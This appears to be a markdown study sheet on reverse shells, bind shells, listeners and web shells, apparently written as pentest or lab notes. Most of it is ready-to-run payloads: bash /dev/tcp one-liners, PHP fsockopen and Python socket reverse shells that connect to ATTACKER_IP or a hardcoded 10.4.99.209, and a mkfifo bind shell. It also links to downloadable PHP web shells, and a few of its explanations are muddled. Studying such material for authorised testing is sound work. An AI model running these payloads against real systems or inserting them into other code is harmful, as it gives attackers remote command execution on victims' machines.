# Shells

## Reverse Shell
- reverse shells initiate from the target machine back to the attacker machine. This can help avoid IDS and bypass firewalls since the connection is coming from and not to the machine. 
- you need to set up a listener for these.
- reverse shells connect back to the listener and you interact with it from there.
- **Any port can be used to wait for a connection, but attackers and pentesters tend to use known ports used by other applications like 53, 80, 8080, 443, 139, or 445.** This is to blend the reverse shell with legitimate traffic and avoid detection by security appliances.
- [Reverse shell payloads cheatsheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- You need to set up a nc listener with `nc -nvlp TARGET_IP PORT`



## Bind Shell
- A bind shell will bind a port on the compromised system and listen for a connection; when this connection occurs, it exposes the shell session so the attacker can execute commands remotely. This method can be used when the compromised target does not allow outgoing connections, but it tends to be less popular since it needs to remain active and listen for connections, which can lead to detection.
- Bind shell example payload: `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f`
- We need to note that ports below **1024** will require Netcat to be executed with elevated privileges. In this case, using port 8080 will avoid this.
- You need to set up a nc listener with: `nc -nv TARGET_IP 8080`


### Listeners

Netcat is just one listener you can use. 

**rlwrap**

It is a small utility that uses the GNU readline library to provide editing keyboard and history.

`rlwrap nc -nvlp 443`

- This wraps nc with rlwrap, allowing the use of features like arrow keys and history for better interaction.
<hr />

**Ncat**

Ncat is an improved version of Netcat distributed by the NMAP project. It provides extra features, like encryption (SSL).
`ncat -lvnp 4444`
`ncat --ssl -lvnp 4444`
- Two examples, with one enabling SSL encryption

<hr />

**Socat**

Socat is a utility that allows you to create a socket connection between two data sources, in this case, two different hosts.

`socat -d -d TCP-LISTEN:443 STDOUT`

- The command above used the -d option to enable verbose output; using it again (-d -d) will increase the verbosity of the commands. The TCP-LISTEN:443 option creates a TCP listener on port 443, establishing a server socket for incoming connections. Finally, the STDOUT option directs any incoming data to the terminal.

<br />

## Shell Payloads

A shell payload can be a command or a script that exposes a shell to an incoming connection (bind shells) or an outgoing connection (reverse shells)

**bash**

Normal Bash Reverse Shell:

`bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1`
- This reverse shell initiates an interactive bash shell that redirects input and output through a TCP connection to the attacker's IP (ATTACKER_IP) on port 443. The >& operator combines both standard output and standard error.

Bash Read Line Reverse Shell:

`exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done` 
- This reverse shell creates a new file descriptor (5 in this case)  and connects to a TCP socket. It will read and execute commands from the socket, sending the output back through the same socket.


Bash with File Descriptor 196 Reverse Shell:

`0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196`
- This reverse shell uses a file descriptor (196 in this case) to establish a TCP connection. It allows the shell to read commands from the network and send output back through the same connection.

Bash with File Descriptor 5 Reverse Shell:

`bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5`
- Similar to the first example, this command opens a shell (bash -i), but it uses file descriptor 5 for input and output, enabling an interactive session over the TCP connection.

<hr />

**PHP**

PHP Reverse Shell Using the exec Function:

`php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'`
- This reverse shell creates a socket connection to the attacker's IP on port 443 and uses the exec function to execute a shell, redirecting standard input and output.

PHP Reverse Shell Using the shell_exec Function:

`php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'`
- Similar to the previous command, but uses the shell_exec function.

PHP Reverse Shell using system function:

`php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'`
- This reverse shell employs the system function, which executes the command and outputs the result to the browser.

PHP Reverse Shell Using the passthru Function:

`php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");`
- The passthru function executes a command and sends raw output back to the browser. This is useful when working with binary data.

PHP Reverse Shell Using the popen Function:

`php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");'`
- This reverse shell uses popen to open a process file pointer, allowing the shell to be executed.

<hr />

**Python**

**the following snippets below require using python -c to run, indicated by the placeholder PY-C**

Python Reverse Shell by Exporting Environment Variables:

`PY-C 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.99.209",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'`
- This reverse shell uses the subprocess module to spawn a shell and set up a similar environment as the Python Reverse Shell by Exporting Environment Variables command.

Short Python Reverse Shell:

`PY-C 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'`
- This reverse shell creates a socket (s), connects to the attacker, and redirects standard input, output, and error to the socket using os.dup2().

<hr />

## Web Shells

A web shell is a script written in a language supported by a compromised web server that executes commands through the web server itself. A web shell is usually a file containing the code that executes commands and handles files. It can be hidden within a compromised web application or service, making it difficult to detect and very popular among attackers. Web shells can be written in several languages supported by web servers, like PHP, ASP, JSP, and even simple CGI scripts. 

Existing Webshells Available online:

- [p0wny-shell](https://github.com/flozz/p0wny-shell) - A minimalistic single-file PHP web shell that allows remote command execution. 

- [b374k-shell](https://github.com/b374k/b374k) - A more feature-rich PHP web shell with file management and command execution, among other functionalities.

- [c99 shell](https://www.r57shell.net/single.php?id=13) - A well-known and robust PHP web shell with extensive functionality.

More shells can be found [here](https://www.r57shell.net/index.php)



        






